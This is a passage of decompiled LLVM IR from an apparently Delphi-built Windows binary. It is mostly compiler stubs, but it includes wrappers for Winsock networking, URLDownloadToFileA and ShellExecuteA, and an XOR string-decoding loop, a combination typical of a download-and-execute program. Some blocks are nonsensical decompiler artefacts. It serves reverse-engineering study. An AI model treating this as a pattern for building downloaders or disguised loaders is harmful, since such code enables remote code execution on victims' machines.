  %0 = call i32 @"@HandleFinally"(), !insn.addr !230
  ret i32 %0, !insn.addr !230
}

define i32 @function_40463e() local_unnamed_addr {
dec_label_pc_40463e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !231
}

define i32 @function_404640(i32 %arg1) local_unnamed_addr {
dec_label_pc_404640:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !232
}

define i32 @function_404644() local_unnamed_addr {
dec_label_pc_404644:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409664, align 4, !insn.addr !233
  %2 = add i32 %1, -1, !insn.addr !233
  store i32 %2, i32* @global_var_409664, align 4, !insn.addr !233
  ret i32 %0, !insn.addr !234
}

define i32 @function_40464f() local_unnamed_addr {
dec_label_pc_40464f:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = add i32 %1, -1, !insn.addr !235
  %4 = inttoptr i32 %1 to i32*, !insn.addr !235
  store i32 %3, i32* %4, align 4, !insn.addr !235
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !236
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !236
  %9 = add i8 %6, %8, !insn.addr !236
  %10 = inttoptr i32 %7 to i8*, !insn.addr !236
  store i8 %9, i8* %10, align 1, !insn.addr !236
  %11 = add i32 %2, 101, !insn.addr !237
  %12 = inttoptr i32 %11 to i8*, !insn.addr !237
  %13 = load i8, i8* %12, align 1, !insn.addr !237
  %14 = udiv i32 %2, 256, !insn.addr !237
  %15 = trunc i32 %14 to i8, !insn.addr !237
  %16 = add i8 %13, %15, !insn.addr !237
  store i8 %16, i8* %12, align 1, !insn.addr !237
  %17 = add i32 %1, 101, !insn.addr !238
  %18 = inttoptr i32 %17 to i32*, !insn.addr !238
  %19 = load i32, i32* %18, align 4, !insn.addr !238
  %20 = mul i32 %19, 1819042862, !insn.addr !238
  %21 = load i8, i8* %5, align 4, !insn.addr !239
  %22 = add i8 %21, %15, !insn.addr !239
  %23 = load i32, i32* %eax, align 4, !insn.addr !239
  %24 = inttoptr i32 %23 to i8*, !insn.addr !239
  store i8 %22, i8* %24, align 1, !insn.addr !239
  %25 = load i8, i8* %5, align 4, !insn.addr !240
  %26 = load i32, i32* %eax, align 4
  %27 = trunc i32 %26 to i8, !insn.addr !240
  %28 = add i8 %25, %27, !insn.addr !240
  %29 = inttoptr i32 %26 to i8*, !insn.addr !240
  store i8 %28, i8* %29, align 1, !insn.addr !240
  %30 = load i8, i8* %5, align 4, !insn.addr !241
  %31 = load i32, i32* %eax, align 4
  %32 = trunc i32 %31 to i8, !insn.addr !241
  %33 = add i8 %30, %32, !insn.addr !241
  %34 = inttoptr i32 %31 to i8*, !insn.addr !241
  store i8 %33, i8* %34, align 1, !insn.addr !241
  %35 = load i8, i8* %5, align 4, !insn.addr !242
  %36 = load i32, i32* %eax, align 4
  %37 = trunc i32 %36 to i8, !insn.addr !242
  %38 = add i8 %35, %37, !insn.addr !242
  %39 = inttoptr i32 %36 to i8*, !insn.addr !242
  store i8 %38, i8* %39, align 1, !insn.addr !242
  %40 = add i32 %0, -117, !insn.addr !243
  %41 = inttoptr i32 %40 to i8*, !insn.addr !243
  %42 = load i8, i8* %41, align 1, !insn.addr !243
  %43 = trunc i32 %2 to i8, !insn.addr !243
  %44 = add i8 %42, %43, !insn.addr !243
  store i8 %44, i8* %41, align 1, !insn.addr !243
  %45 = trunc i32 %2 to i16, !insn.addr !244
  %46 = call i8 @__asm_in(i16 %45), !insn.addr !244
  %47 = add i32 %20, -8, !insn.addr !245
  %48 = inttoptr i32 %47 to i32*, !insn.addr !245
  store i32 4212417, i32* %48, align 4, !insn.addr !245
  %49 = call i32 @__readfsdword(i32 0), !insn.addr !246
  %50 = add i32 %20, -12, !insn.addr !246
  %51 = inttoptr i32 %50 to i32*, !insn.addr !246
  store i32 %49, i32* %51, align 4, !insn.addr !246
  call void @__writefsdword(i32 0, i32 %50), !insn.addr !247
  %52 = load i32, i32* @global_var_409678, align 4, !insn.addr !248
  %53 = add i32 %52, 1, !insn.addr !248
  %54 = icmp eq i32 %53, 0, !insn.addr !248
  store i32 %53, i32* @global_var_409678, align 4, !insn.addr !248
  %55 = icmp eq i1 %54, false, !insn.addr !249
  br i1 %55, label %dec_label_pc_4046b3, label %dec_label_pc_404681, !insn.addr !249

dec_label_pc_404681:                              ; preds = %dec_label_pc_40464f
  %56 = call i32 @"@LStrClr"(), !insn.addr !250
  %57 = call i32 @"@LStrClr"(), !insn.addr !251
  %58 = call i32 @"@LStrClr"(), !insn.addr !252
  %59 = call i32 @"@LStrClr"(), !insn.addr !253
  %60 = call i32 @"@LStrClr"(), !insn.addr !254
  br label %dec_label_pc_4046b3, !insn.addr !254

dec_label_pc_4046b3:                              ; preds = %dec_label_pc_404681, %dec_label_pc_40464f
  %61 = add i32 %20, -4, !insn.addr !255
  %62 = inttoptr i32 %61 to i32*, !insn.addr !255
  %63 = load i32, i32* %51, align 4, !insn.addr !256
  call void @__writefsdword(i32 0, i32 %63), !insn.addr !257
  store i32 4212424, i32* %62, align 4, !insn.addr !258
  ret i32 0, !insn.addr !259
}

define i32 @function_4046c1() local_unnamed_addr {
dec_label_pc_4046c1:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !260
  ret i32 %0, !insn.addr !260
}

define i32 @function_4046c6() local_unnamed_addr {
dec_label_pc_4046c6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !261
}

define i32 @function_4046c8(i32 %arg1) local_unnamed_addr {
dec_label_pc_4046c8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !262
}

define i32 @function_4046cc() local_unnamed_addr {
dec_label_pc_4046cc:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409678, align 4, !insn.addr !263
  %2 = add i32 %1, -1, !insn.addr !263
  store i32 %2, i32* @global_var_409678, align 4, !insn.addr !263
  ret i32 %0, !insn.addr !264
}

define i32 @function_4046d4() local_unnamed_addr {
dec_label_pc_4046d4:
  %eax.1.reg2mem = alloca i32, !insn.addr !265
  %esi.0.reg2mem = alloca i32, !insn.addr !265
  %ebx.0.reg2mem = alloca i32, !insn.addr !265
  %eax.0.reg2mem = alloca i32, !insn.addr !265
  %0 = call i32 @function_403720(), !insn.addr !266
  %1 = call i32 @function_4034c8(), !insn.addr !267
  %2 = icmp slt i32 %1, 1
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !268
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !268
  store i32 %0, i32* %esi.0.reg2mem, !insn.addr !268
  store i32 %1, i32* %eax.1.reg2mem, !insn.addr !268
  br i1 %2, label %dec_label_pc_404709, label %dec_label_pc_4046ef, !insn.addr !268

dec_label_pc_4046ef:                              ; preds = %dec_label_pc_4046d4, %dec_label_pc_4046ef
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %3 = add i32 %ebx.0.reload, ptrtoint (i8** @global_var_4080d0 to i32), !insn.addr !269
  %4 = inttoptr i32 %3 to i8*, !insn.addr !269
  %5 = load i8, i8* %4, align 1, !insn.addr !269
  %6 = inttoptr i32 %esi.0.reload to i8*, !insn.addr !270
  %7 = load i8, i8* %6, align 1, !insn.addr !270
  %8 = xor i8 %7, %5, !insn.addr !270
  store i8 %8, i8* %6, align 1, !insn.addr !270
  %9 = add i32 %esi.0.reload, 1, !insn.addr !271
  %10 = add i32 %ebx.0.reload, 1, !insn.addr !272
  %11 = and i32 %10, -2147483641, !insn.addr !273
  %12 = icmp slt i32 %11, 0, !insn.addr !273
  %13 = icmp eq i1 %12, false, !insn.addr !274
  %14 = or i32 %ebx.0.reload, -8
  %15 = add nsw i32 %14, 1
  %ebx.1 = select i1 %13, i32 %11, i32 %15
  %16 = add i32 %eax.0.reload, -1, !insn.addr !275
  %17 = icmp eq i32 %16, 0, !insn.addr !275
  %18 = icmp eq i1 %17, false, !insn.addr !276
  store i32 %16, i32* %eax.0.reg2mem, !insn.addr !276
  store i32 %ebx.1, i32* %ebx.0.reg2mem, !insn.addr !276
  store i32 %9, i32* %esi.0.reg2mem, !insn.addr !276
  store i32 %16, i32* %eax.1.reg2mem, !insn.addr !276
  br i1 %18, label %dec_label_pc_4046ef, label %dec_label_pc_404709, !insn.addr !276

dec_label_pc_404709:                              ; preds = %dec_label_pc_4046ef, %dec_label_pc_4046d4
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !277
}

define i32 @function_404710() local_unnamed_addr {
dec_label_pc_404710:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !278
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !278
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !278
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !279
  %2 = load i32, i32* @global_var_40967c, align 4, !insn.addr !280
  %3 = add i32 %2, 1, !insn.addr !280
  store i32 %3, i32* @global_var_40967c, align 4, !insn.addr !280
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !281
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !282
  ret i32 0, !insn.addr !283
}

define i32 @function_404735() local_unnamed_addr {
dec_label_pc_404735:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !284
  ret i32 %0, !insn.addr !284
}

define i32 @function_40473a() local_unnamed_addr {
dec_label_pc_40473a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !285
}

define i32 @function_40473c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40473c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !286
}

define i32 @function_404740() local_unnamed_addr {
dec_label_pc_404740:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40967c, align 4, !insn.addr !287
  %2 = add i32 %1, -1, !insn.addr !287
  store i32 %2, i32* @global_var_40967c, align 4, !insn.addr !287
  ret i32 %0, !insn.addr !288
}

define i32 @function_404748() local_unnamed_addr {
dec_label_pc_404748:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !289
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !289
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !289
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !290
  %2 = load i32, i32* @global_var_409680, align 4, !insn.addr !291
  %3 = add i32 %2, 1, !insn.addr !291
  store i32 %3, i32* @global_var_409680, align 4, !insn.addr !291
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !292
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !293
  ret i32 0, !insn.addr !294
}

define i32 @function_40476d() local_unnamed_addr {
dec_label_pc_40476d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !295
  ret i32 %0, !insn.addr !295
}

define i32 @function_404772() local_unnamed_addr {
dec_label_pc_404772:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !296
}

define i32 @function_404774(i32 %arg1) local_unnamed_addr {
dec_label_pc_404774:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !297
}

define i32 @function_404778() local_unnamed_addr {
dec_label_pc_404778:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409680, align 4, !insn.addr !298
  %2 = add i32 %1, -1, !insn.addr !298
  store i32 %2, i32* @global_var_409680, align 4, !insn.addr !298
  ret i32 %0, !insn.addr !299
}

define i32 @function_404780(i32 %s) local_unnamed_addr {
dec_label_pc_404780:
  %0 = call i32 @closesocket(i32 %s), !insn.addr !300
  ret i32 %0, !insn.addr !300
}

define i32 @function_404788(i32 %s, %sockaddr* %name, i32 %namelen) local_unnamed_addr {
dec_label_pc_404788:
  %0 = call i32 @connect(i32 %s, %sockaddr* %name, i32 %namelen), !insn.addr !301
  ret i32 %0, !insn.addr !301
}

define i16 @function_404790(i16 %hostshort) local_unnamed_addr {
dec_label_pc_404790:
  %0 = call i16 @htons(i16 %hostshort), !insn.addr !302
  ret i16 %0, !insn.addr !302
}

define i8* @function_404798(%in_addr %in) local_unnamed_addr {
dec_label_pc_404798:
  %0 = call i8* @inet_ntoa(%in_addr %in), !insn.addr !303
  ret i8* %0, !insn.addr !303
}

define i32 @function_4047a0(i32 %s, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
dec_label_pc_4047a0:
  %0 = call i32 @recv(i32 %s, i8* %buf, i32 %len, i32 %flags), !insn.addr !304
  ret i32 %0, !insn.addr !304
}

define i32 @function_4047a8(i32 %s, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
dec_label_pc_4047a8:
  %0 = call i32 @send(i32 %s, i8* %buf, i32 %len, i32 %flags), !insn.addr !305
  ret i32 %0, !insn.addr !305
}

define i32 @function_4047b0(i32 %af, i32 %type, i32 %protocol) local_unnamed_addr {
dec_label_pc_4047b0:
  %0 = call i32 @socket(i32 %af, i32 %type, i32 %protocol), !insn.addr !306
  ret i32 %0, !insn.addr !306
}

define %hostent* @function_4047b8(i8* %name) local_unnamed_addr {
dec_label_pc_4047b8:
  %0 = call %hostent* @gethostbyname(i8* %name), !insn.addr !307
  ret %hostent* %0, !insn.addr !307
}

define i32 @function_4047c0(i8* %name, i32 %namelen) local_unnamed_addr {
dec_label_pc_4047c0:
  %0 = call i32 @gethostname(i8* %name, i32 %namelen), !insn.addr !308
  ret i32 %0, !insn.addr !308
}

define i32 @function_4047c8(i16 %wVersionRequested, %WSAData* %lpWSAData) local_unnamed_addr {
dec_label_pc_4047c8:
  %0 = call i32 @WSAStartup(i16 %wVersionRequested, %WSAData* %lpWSAData), !insn.addr !309
  ret i32 %0, !insn.addr !309
}

define i32 @function_4047d0() local_unnamed_addr {
dec_label_pc_4047d0:
  %0 = call i32 @WSACleanup(), !insn.addr !310
  ret i32 %0, !insn.addr !310
}

define i32 @function_4047d8() local_unnamed_addr {
dec_label_pc_4047d8:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !311
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !311
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !311
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !312
  %2 = load i32, i32* @global_var_409684, align 4, !insn.addr !313
  %3 = add i32 %2, 1, !insn.addr !313
  store i32 %3, i32* @global_var_409684, align 4, !insn.addr !313
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !314
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !315
  ret i32 0, !insn.addr !316
}

define i32 @function_4047fd() local_unnamed_addr {
dec_label_pc_4047fd:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !317
  ret i32 %0, !insn.addr !317
}

define i32 @function_404802() local_unnamed_addr {
dec_label_pc_404802:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !318
}

define i32 @function_404804(i32 %arg1) local_unnamed_addr {
dec_label_pc_404804:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !319
}

define i32 @function_404808() local_unnamed_addr {
dec_label_pc_404808:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409684, align 4, !insn.addr !320
  %2 = add i32 %1, -1, !insn.addr !320
  store i32 %2, i32* @global_var_409684, align 4, !insn.addr !320
  ret i32 %0, !insn.addr !321
}

define i32 @function_4049a8() local_unnamed_addr {
dec_label_pc_4049a8:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !322
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !322
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !322
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !323
  %2 = load i32, i32* @global_var_409688, align 4, !insn.addr !324
  %3 = add i32 %2, 1, !insn.addr !324
  store i32 %3, i32* @global_var_409688, align 4, !insn.addr !324
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !325
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !326
  ret i32 0, !insn.addr !327
}

define i32 @function_4049cd() local_unnamed_addr {
dec_label_pc_4049cd:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !328
  ret i32 %0, !insn.addr !328
}

define i32 @function_4049d2() local_unnamed_addr {
dec_label_pc_4049d2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !329
}

define i32 @function_4049d4(i32 %arg1) local_unnamed_addr {
dec_label_pc_4049d4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !330
}

define i32 @function_4049d8() local_unnamed_addr {
dec_label_pc_4049d8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409688, align 4, !insn.addr !331
  %2 = add i32 %1, -1, !insn.addr !331
  store i32 %2, i32* @global_var_409688, align 4, !insn.addr !331
  ret i32 %0, !insn.addr !332
}

define i32 @function_4049e0() local_unnamed_addr {
dec_label_pc_4049e0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !333
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !333
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !333
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !334
  %2 = load i32, i32* @global_var_40968c, align 4, !insn.addr !335
  %3 = add i32 %2, 1, !insn.addr !335
  store i32 %3, i32* @global_var_40968c, align 4, !insn.addr !335
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !336
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !337
  ret i32 0, !insn.addr !338
}

define i32 @function_404a05() local_unnamed_addr {
dec_label_pc_404a05:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !339
  ret i32 %0, !insn.addr !339
}

define i32 @function_404a0a() local_unnamed_addr {
dec_label_pc_404a0a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !340
}

define i32 @function_404a0c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a0c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !341
}

define i32 @function_404a10() local_unnamed_addr {
dec_label_pc_404a10:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40968c, align 4, !insn.addr !342
  %2 = add i32 %1, -1, !insn.addr !342
  store i32 %2, i32* @global_var_40968c, align 4, !insn.addr !342
  ret i32 %0, !insn.addr !343
}

define i32* @function_404a18(i32* %hwnd, i8* %lpOperation, i8* %lpFile, i8* %lpParameters, i8* %lpDirectory, i32 %nShowCmd) local_unnamed_addr {
dec_label_pc_404a18:
  %0 = call i32* @ShellExecuteA(i32* %hwnd, i8* %lpOperation, i8* %lpFile, i8* %lpParameters, i8* %lpDirectory, i32 %nShowCmd), !insn.addr !344
  ret i32* %0, !insn.addr !344
}

define i32 @function_404a20() local_unnamed_addr {
dec_label_pc_404a20:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !345
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !345
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !345
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !346
  %2 = load i32, i32* @global_var_409690, align 4, !insn.addr !347
  %3 = add i32 %2, 1, !insn.addr !347
  store i32 %3, i32* @global_var_409690, align 4, !insn.addr !347
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !348
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !349
  ret i32 0, !insn.addr !350
}

define i32 @function_404a45() local_unnamed_addr {
dec_label_pc_404a45:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !351
  ret i32 %0, !insn.addr !351
}

define i32 @function_404a4a() local_unnamed_addr {
dec_label_pc_404a4a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !352
}

define i32 @function_404a4c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a4c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !353
}

define i32 @function_404a50() local_unnamed_addr {
dec_label_pc_404a50:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409690, align 4, !insn.addr !354
  %2 = add i32 %1, -1, !insn.addr !354
  store i32 %2, i32* @global_var_409690, align 4, !insn.addr !354
  ret i32 %0, !insn.addr !355
}

define i32 @function_404a58() local_unnamed_addr {
dec_label_pc_404a58:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !356
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !356
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !356
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !357
  %2 = load i32, i32* @global_var_409694, align 4, !insn.addr !358
  %3 = add i32 %2, 1, !insn.addr !358
  store i32 %3, i32* @global_var_409694, align 4, !insn.addr !358
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !359
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !360
  ret i32 0, !insn.addr !361
}

define i32 @function_404a7d() local_unnamed_addr {
dec_label_pc_404a7d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !362
  ret i32 %0, !insn.addr !362
}

define i32 @function_404a82() local_unnamed_addr {
dec_label_pc_404a82:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !363
}

define i32 @function_404a84(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a84:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !364
}

define i32 @function_404a88() local_unnamed_addr {
dec_label_pc_404a88:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409694, align 4, !insn.addr !365
  %2 = add i32 %1, -1, !insn.addr !365
  store i32 %2, i32* @global_var_409694, align 4, !insn.addr !365
  ret i32 %0, !insn.addr !366
}

define i32 @function_404a90() local_unnamed_addr {
dec_label_pc_404a90:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !367
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !367
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !367
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !368
  %2 = load i32, i32* @global_var_409698, align 4, !insn.addr !369
  %3 = add i32 %2, 1, !insn.addr !369
  store i32 %3, i32* @global_var_409698, align 4, !insn.addr !369
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !370
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !371
  ret i32 0, !insn.addr !372
}

define i32 @function_404ab5() local_unnamed_addr {
dec_label_pc_404ab5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !373
  ret i32 %0, !insn.addr !373
}

define i32 @function_404aba() local_unnamed_addr {
dec_label_pc_404aba:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !374
}

define i32 @function_404abc(i32 %arg1) local_unnamed_addr {
dec_label_pc_404abc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !375
}

define i32 @function_404ac0() local_unnamed_addr {
dec_label_pc_404ac0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409698, align 4, !insn.addr !376
  %2 = add i32 %1, -1, !insn.addr !376
  store i32 %2, i32* @global_var_409698, align 4, !insn.addr !376
  ret i32 %0, !insn.addr !377
}

define i32 @function_404ac8(i32* %arg1, i8* %arg2, i8* %arg3, i32 %arg4, i32* %arg5) local_unnamed_addr {
dec_label_pc_404ac8:
  %0 = call i32 @URLDownloadToFileA(i32* %arg1, i8* %arg2, i8* %arg3, i32 %arg4, i32* %arg5), !insn.addr !378
  ret i32 %0, !insn.addr !378
}

define i32 @function_404ad0() local_unnamed_addr {
dec_label_pc_404ad0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !379
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !379
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !379
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !380
  %2 = load i32, i32* @global_var_40969c, align 4, !insn.addr !381
  %3 = add i32 %2, 1, !insn.addr !381
  store i32 %3, i32* @global_var_40969c, align 4, !insn.addr !381
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !382
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !383
  ret i32 0, !insn.addr !384
}

define i32 @function_404af5() local_unnamed_addr {
dec_label_pc_404af5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !385
  ret i32 %0, !insn.addr !385
}

define i32 @function_404afa() local_unnamed_addr {
dec_label_pc_404afa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !386
}

define i32 @function_404afc(i32 %arg1) local_unnamed_addr {
dec_label_pc_404afc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !387
}

define i32 @function_404b00() local_unnamed_addr {
dec_label_pc_404b00:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40969c, align 4, !insn.addr !388
  %2 = add i32 %1, -1, !insn.addr !388
  store i32 %2, i32* @global_var_40969c, align 4, !insn.addr !388
  ret i32 %0, !insn.addr !389
}

define i32 @function_404b08() local_unnamed_addr {
dec_label_pc_404b08:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8, !insn.addr !390
  %2 = icmp ult i8 %1, 10
  %3 = and i32 %0, 255
  br i1 %2, label %dec_label_pc_404b0c, label %dec_label_pc_404b15, !insn.addr !391

dec_label_pc_404b0c:                              ; preds = %dec_label_pc_404b08
  %4 = add nuw nsw i32 %3, 48, !insn.addr !392
  ret i32 %4, !insn.addr !393

dec_label_pc_404b15:                              ; preds = %dec_label_pc_404b08
  %5 = add nuw nsw i32 %3, 55, !insn.addr !394
  ret i32 %5, !insn.addr !395
}

define i32 @function_404b20() local_unnamed_addr {
dec_label_pc_404b20:
  %esp.2.reg2mem = alloca i32, !insn.addr !396
  %esp.1.reg2mem = alloca i32, !insn.addr !396
  %cf.0.reg2mem = alloca i1, !insn.addr !396
  %esi.0.reg2mem = alloca i32, !insn.addr !396
  %esp.0.reg2mem = alloca i32, !insn.addr !396
  %ebx.0.reg2mem = alloca i32, !insn.addr !396
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !397
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !398
  store i32 %2, i32* %stack_var_-52, align 4, !insn.addr !398
  %3 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !398
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !399
  %4 = call i32 @"@LStrClr"(), !insn.addr !400
  %5 = call i32 @function_4034c8(), !insn.addr !401
  %6 = icmp slt i32 %5, 1
  store i32 %3, i32* %esp.2.reg2mem, !insn.addr !402
  br i1 %6, label %dec_label_pc_404c21, label %dec_label_pc_404b6d.preheader, !insn.addr !402

dec_label_pc_404b6d.preheader:                    ; preds = %dec_label_pc_404b20
  %7 = add i32 %0, -1, !insn.addr !403
  store i32 1, i32* %ebx.0.reg2mem
  store i32 %3, i32* %esp.0.reg2mem
  store i32 %5, i32* %esi.0.reg2mem
  br label %dec_label_pc_404b6d

dec_label_pc_404b6d:                              ; preds = %dec_label_pc_404b6d.preheader, %dec_label_pc_404c19
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %7, %ebx.0.reload, !insn.addr !403
  %9 = inttoptr i32 %8 to i8*, !insn.addr !403
  %10 = load i8, i8* %9, align 1, !insn.addr !403
  %11 = icmp eq i8 %10, 32, !insn.addr !403
  %12 = icmp eq i1 %11, false, !insn.addr !404
  br i1 %12, label %dec_label_pc_404b88, label %dec_label_pc_404b77, !insn.addr !404

dec_label_pc_404b77:                              ; preds = %dec_label_pc_404b6d
  %13 = call i32 @"@LStrCat"(), !insn.addr !405
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !406
  br label %dec_label_pc_404c19, !insn.addr !406

dec_label_pc_404b88:                              ; preds = %dec_label_pc_404b6d
  %14 = icmp ult i8 %10, 32, !insn.addr !407
  br i1 %14, label %dec_label_pc_404bab, label %dec_label_pc_404b92, !insn.addr !408

dec_label_pc_404b92:                              ; preds = %dec_label_pc_404b88
  %15 = add i8 %10, -32, !insn.addr !409
  %16 = icmp ult i8 %15, 95, !insn.addr !410
  %17 = icmp ult i8 %15, 96
  store i1 %16, i1* %cf.0.reg2mem, !insn.addr !411
  br i1 %17, label %dec_label_pc_404b9f, label %dec_label_pc_404ba9, !insn.addr !411

dec_label_pc_404b9f:                              ; preds = %dec_label_pc_404b92
  %18 = load i32, i32* inttoptr (i32 4213856 to i32*), align 32, !insn.addr !412
  %19 = and i8 %15, 31
